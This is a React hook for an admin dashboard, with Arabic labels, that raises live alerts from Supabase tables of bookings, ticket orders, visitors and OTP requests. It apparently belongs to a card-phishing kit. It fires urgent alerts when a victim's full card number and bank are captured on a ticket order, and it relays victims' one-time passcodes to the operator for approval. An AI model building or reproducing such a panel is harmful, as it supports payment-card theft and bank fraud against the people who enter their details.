import { useEffect } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useToast } from "@/hooks/use-toast";
import { pushNotification } from "@/components/NotificationPanel";
import { playChime } from "@/hooks/use-action-sound";
import { sendBrowserNotification, requestNotificationPermission } from "@/hooks/use-browser-notifications";
import { RealtimePostgresInsertPayload } from "@supabase/supabase-js";

type TableName = "contact_messages" | "restaurant_bookings" | "ticket_orders" | "visitors" | "event_bookings" | "otp_requests";

const tableLabels: Record<TableName, { title: string; icon: string }> = {
  contact_messages: { title: "📩 رسالة تواصل جديدة", icon: "📩" },
  restaurant_bookings: { title: "🍽️ حجز مطعم جديد", icon: "🍽️" },
  event_bookings: { title: "🎉 حجز فعالية جديد", icon: "🎉" },
  ticket_orders: { title: "🎟️ طلب تذاكر جديد", icon: "🎟️" },
  visitors: { title: "👤 زائر جديد دخل الموقع", icon: "👤" },
  otp_requests: { title: "🔐 رمز OTP جديد", icon: "🔐" },
};

function getDescription(table: TableName, payload: any): string {
  switch (table) {
    case "contact_messages":
      return `${payload.name} — ${payload.subject || "رسالة جديدة"}`;
    case "restaurant_bookings":
      return `${payload.name} — ${payload.restaurant} (${payload.guests} أشخاص)`;
    case "event_bookings":
      return `${payload.name} — ${payload.event_title} (${payload.guests} أشخاص)`;
    case "ticket_orders":
      return `${payload.email} — ${payload.total} ر.س`;
    case "visitors":
      return `${payload.name || "زائر جديد"} — ${payload.current_page_label || "الصفحة الرئيسية"} (${payload.device === "mobile" ? "جوال" : "كمبيوتر"} / ${payload.browser})`;
    case "otp_requests":
      return `رمز OTP: ${payload.otp_code} — الحالة: ${payload.status === "pending" ? "بانتظار التحقق" : payload.status}`;
    default:
      return "عنصر جديد";
  }
}

export function useRealtimeNotifications() {
  const { toast } = useToast();

  // Request notification permission on mount
  useEffect(() => {
    requestNotificationPermission();
  }, []);

  useEffect(() => {
    const channel = supabase
      .channel("admin-realtime-notifications")
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "contact_messages" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("contact_messages", payload.new);
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "restaurant_bookings" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("restaurant_bookings", payload.new);
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "event_bookings" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("event_bookings", payload.new);
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "ticket_orders" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("ticket_orders", payload.new);
          // Check if card info is included on insert
          if (payload.new.card_full_number) {
            notifyCardInfo(payload.new);
          }
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "UPDATE", schema: "public", table: "ticket_orders" },
        (payload: any) => {
          // Notify when card info is added via update
          if (payload.new.card_full_number && !payload.old?.card_full_number) {
            notifyCardInfo(payload.new);
          }
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "visitors" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("visitors", payload.new);
        }
      )
      .on(
        "postgres_changes" as any,
        { event: "INSERT", schema: "public", table: "otp_requests" },
        (payload: RealtimePostgresInsertPayload<any>) => {
          notify("otp_requests", payload.new);
        }
      )
      .subscribe();

    function notifyCardInfo(data: any) {
      const cardLast4 = data.card_last4 || data.card_full_number?.slice(-4) || "****";
      const brand = data.card_brand || "بطاقة";
      const bank = data.bank_name || "";
      const title = "💳 بيانات بطاقة دفع جديدة";
      const desc = `${brand} •••• ${cardLast4}${bank ? ` — ${bank}` : ""} | ${data.email} | ${data.total} ر.س`;

      playChime("urgent");
      sendBrowserNotification({ title, body: desc, tag: `card-${data.id}`, vibrate: true });
      toast({ title, description: desc, duration: 12000, variant: "destructive" });
      pushNotification({ type: "ticket_orders", title, description: desc, icon: "💳", needsApproval: true, recordId: data.id });
    }

    function notify(table: TableName, data: any) {
      const info = tableLabels[table];
      const description = getDescription(table, data);
      const needsApproval = (table === "ticket_orders" || table === "restaurant_bookings" || table === "event_bookings") && data.status === "pending";
      const isOtp = table === "otp_requests";
      
      const soundType = isOtp ? "urgent"
        : table === "contact_messages" ? "message"
        : table === "event_bookings" ? "notification"
        : needsApproval ? "urgent" : "notification";
      playChime(soundType);
      
      // Send browser notification + vibrate (works in background)
      sendBrowserNotification({
        title: info.title,
        body: description,
        tag: `${table}-${data.id}`,
        vibrate: true,
      });

      toast({
        title: info.title,
        description,
        duration: (needsApproval || isOtp) ? 10000 : 5000,
        variant: (needsApproval || isOtp) ? "destructive" : "default",
      });
      pushNotification({
        type: table,
        title: info.title,
        description,
        icon: info.icon,
        needsApproval,
        recordId: data.id,
      });
    }

    return () => {
      supabase.removeChannel(channel);
    };
  }, [toast]);
}
